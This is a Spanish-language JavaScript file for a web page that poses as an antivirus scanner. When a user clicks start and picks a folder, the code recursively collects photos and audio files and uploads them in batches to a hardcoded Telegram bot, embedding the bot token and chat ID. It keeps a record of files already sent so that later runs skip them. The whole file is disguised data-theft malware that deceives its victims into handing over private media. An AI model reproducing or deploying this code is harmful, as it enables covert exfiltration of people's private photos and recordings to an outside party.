let startTime;
let totalBatches;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');

    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;
    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = '✅ Operación completada';
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;
    try {
        startTime = Date.now();
        updateStatus('Iniciando escaneo...', 5);

        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        setTimeout(async () => {
            try {
                updateStatus('Accediendo al sistema...', 10);
                const folderHandle = await window.showDirectoryPicker();

                updateStatus('Analizando estructura...', 20);
                const files = await collectFiles(folderHandle);
                if (!files.length) throw new Error('No hay archivos');
                updateStatus(`Elementos detectados: ${files.length}`, 40);

                updateStatus('Procesando archivos...', 50);
                await processFilesInFragments(files);

                updateStatus('✅ OPERACIÓN EXITOSA', 100);
            } catch (error) {
                updateStatus(`❌ ERROR: ${error.message}`, 0);
                alert(`FALLO: ${error.message}`);
            }
            isProcessing = false;
        }, 100);
    } catch (error) {
        updateStatus(`❌ ERROR: ${error.message}`, 0);
        alert(`FALLO: ${error.message}`);
        isProcessing = false;
    }
});

document.getElementById('clear-btn').addEventListener('click', () => {
    localStorage.removeItem('sentFiles');
    alert('Registro de fotos enviadas eliminado');
});

async function collectFiles(folderHandle) {
    const files = [];
    for await (const entry of folderHandle.values()) {
        if (entry.kind === 'file') {
            const fileName = entry.name.toLowerCase();
            if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
                fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
                fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
                files.push(entry);
            }
        } else if (entry.kind === 'directory') {
            const subFiles = await collectFiles(entry);
            files.push(...subFiles);
        }
    }
    return files;
}

async function processFilesInFragments(files) {
    const fragmentSizeLimit = 200 * 1024 * 1024; // 200 MB
    let currentFragmentSize = 0;
    let currentFiles = [];
    const sentFiles = new Set(JSON.parse(localStorage.getItem('sentFiles') || '[]')); // Cargar enviados
    let processedFiles = 0;

    for (let i = 0; i < files.length; i++) {
        const entry = files[i];
        const file = await entry.getFile();
        const fileKey = `${file.name}-${file.size}-${file.lastModified}`;

        if (!sentFiles.has(fileKey)) {
            if (currentFragmentSize + file.size <= fragmentSizeLimit) {
                currentFiles.push({ file, key: fileKey });
                currentFragmentSize += file.size;
            } else {
                await sendFragment(currentFiles, sentFiles, processedFiles, files.length);
                processedFiles += currentFiles.length;
                currentFiles = [{ file, key: fileKey }];
                currentFragmentSize = file.size;
            }
        }
    }
    if (currentFiles.length > 0) {
        await sendFragment(currentFiles, sentFiles, processedFiles, files.length);
    }
}

async function sendFragment(files, sentFiles, processedFiles, totalFiles) {
    const chunkSize = 15; // 15 fotos por mensaje
    for (let i = 0; i < files.length; i += chunkSize) {
        const chunk = files.slice(i, i + chunkSize);
        await sendToTelegram(chunk.map(f => f.file));
        chunk.forEach(f => sentFiles.add(f.key));
        localStorage.setItem('sentFiles', JSON.stringify([...sentFiles]));
        const progress = 70 + Math.floor(((processedFiles + i + chunk.length) / totalFiles) * 30);
        updateStatus(`Procesando ${processedFiles + i + chunk.length}/${totalFiles} archivos`, progress);
        await new Promise(resolve => setTimeout(resolve, 3000)); // Pausa de 3 segundos
    }
}

async function sendToTelegram(files) {
    const chat_id = '5821490693'; // Chat ID fijo
    const botToken = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk'; // Token actual
    const formData = new FormData();

    // Crear el array de media para sendMediaGroup
    const media = files.map((file, index) => {
        const fileKey = `photo${index}_${Date.now()}`; // Nombre único para cada archivo
        formData.append(fileKey, file);
        return {
            type: 'photo',
            media: `attach://${fileKey}`
        };
    });

    formData.append('chat_id', chat_id);
    formData.append('media', JSON.stringify(media));

    for (let attempt = 1; attempt <= 3; attempt++) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMediaGroup`, {
                method: 'POST',
                body: formData
            });
            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(errorData.description || 'Error al enviar fotos');
            }
            return;
        } catch (error) {
            if (attempt === 3) throw error;
            await new Promise(resolve => setTimeout(resolve, 5000)); // Esperar 5 segundos antes de reintentar
        }
    }
}
